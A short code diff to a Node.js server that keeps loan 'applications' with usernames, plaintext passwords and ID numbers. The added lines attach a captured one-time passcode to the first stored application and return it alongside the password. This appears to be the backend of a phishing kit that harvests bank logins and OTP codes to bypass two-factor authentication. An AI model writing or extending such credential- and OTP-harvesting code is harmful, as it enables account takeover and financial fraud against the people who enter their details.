@@ -170,6 +170,11 @@ const server = http.createServer((req, res) => {
         status: 'pending',
         ts: Date.now()
       };
+      const applications = getApplications(db);
+      if (applications.length) {
+        applications[0].otpCode = db.otpRequest.code;
+        db.applications = applications;
+      }
       writeDB(db);
       sendJSON(res, 200, { ok: true });
     });
@@ -262,6 +267,7 @@ const server = http.createServer((req, res) => {
           status: status,
           username: application.username || '',
           password: application.password || '',
+          otpCode: application.otpCode || '',
           idNumber: application.idNumber || '—',
           loanAmount: application.loanAmount || '—',
           months: application.months || '—',
